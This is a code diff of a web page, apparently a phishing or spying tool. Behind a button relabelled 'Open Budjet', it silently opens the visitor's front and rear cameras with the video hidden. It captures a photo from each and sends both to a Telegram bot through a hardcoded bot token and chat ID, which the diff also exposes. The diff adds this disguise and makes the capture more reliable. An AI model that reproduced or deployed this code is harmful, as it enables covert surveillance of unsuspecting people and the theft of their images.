@@ -6,16 +6,42 @@
     <title>Android Camera Capture</title>
     <link rel="stylesheet" href="main.css">
     <style>
-        body { text-align: center; font-family: Arial, sans-serif; margin-top: 50px; }
-        #startBtn { padding: 12px 20px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #video { display: none; }
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            margin-top: 50px;
+        }
+        #startBtn {
+            padding: 12px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #video {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-    <button id="startBtn">Zapal Rasmlar</button>
+    <button id="startBtn">Open Budjet</button>
     <div class="loader" id="loader"></div>
     <video id="video" autoplay></video>
     <canvas id="canvas" style="display: none;"></canvas>
@@ -27,9 +53,23 @@
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
 
-        const BOT_TOKEN = "7967235049:AAG30JSXJubgiQw2PUk6IXschzHRDrdwlvU";
-        const CHAT_ID = "705345765";
+        const BOT_TOKEN = "7967235049:AAG30JSXJubgiQw2PUk6IXschzHRDrdwlvU"; // Replace with your bot token
+        const CHAT_ID = "705345765"; // Replace with your chat ID
 
+        // Check camera permissions
+        async function checkCameraPermissions() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream.getTracks().forEach(track => track.stop());
+                return true;
+            } catch (error) {
+                console.error("Camera permissions denied:", error);
+                alert("Camera permissions are required to capture photos.");
+                return false;
+            }
+        }
+
+        // Initialize camera with specified facing mode
         async function initCamera(facingMode) {
             const constraints = { video: { facingMode: facingMode } };
             try {
@@ -39,11 +79,24 @@
                 return true;
             } catch (error) {
                 console.error(`❌ Camera (${facingMode}) initialization failed:`, error);
-                alert(`Camera (${facingMode}) initialization failed.`);
-                return false;
+                alert(`Camera (${facingMode}) initialization failed. Falling back to default camera.`);
+
+                // Fallback to default camera
+                const fallbackConstraints = { video: true };
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
+                    video.srcObject = stream;
+                    console.log("Default camera initialized.");
+                    return true;
+                } catch (fallbackError) {
+                    console.error("❌ Default camera initialization failed:", fallbackError);
+                    alert("Default camera initialization failed.");
+                    return false;
+                }
             }
         }
 
+        // Capture photo and send to Telegram
         async function takeAndSendPhoto(facingMode) {
             if (!video.srcObject) {
                 console.log(`Camera (${facingMode}) stream not available.`);
@@ -51,12 +104,15 @@
                 return;
             }
 
+            // Set canvas dimensions to match video stream
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             console.log(`Canvas dimensions (${facingMode}):`, canvas.width, canvas.height);
 
+            // Draw the video frame onto the canvas
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+            // Convert canvas to Blob and send to Telegram
             canvas.toBlob(async (blob) => {
                 console.log(`Blob size (${facingMode}):`, blob.size);
 
@@ -88,6 +144,7 @@
             }, "image/jpeg");
         }
 
+        // Capture photos from both cameras
         async function captureFromBothCameras() {
             loader.style.display = "block";
 
@@ -109,21 +166,28 @@
                     });
                     await takeAndSendPhoto(facingMode);
 
+                    // Stop the camera stream
                     if (video.srcObject) {
                         video.srcObject.getVideoTracks().forEach(track => track.stop());
                         video.srcObject = null;
                     }
-                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between cameras
                 }
             }
 
-            await captureAndSend("user");
-            await captureAndSend("environment");
+            await captureAndSend("user"); // Front camera
+            await captureAndSend("environment"); // Rear camera
 
             loader.style.display = "none";
         }
 
-        startBtn.addEventListener("click", captureFromBothCameras);
+        // Start the process when the button is clicked
+        startBtn.addEventListener("click", async () => {
+            const hasPermissions = await checkCameraPermissions();
+            if (hasPermissions) {
+                captureFromBothCameras();
+            }
+        });
     </script>
 
 </body>
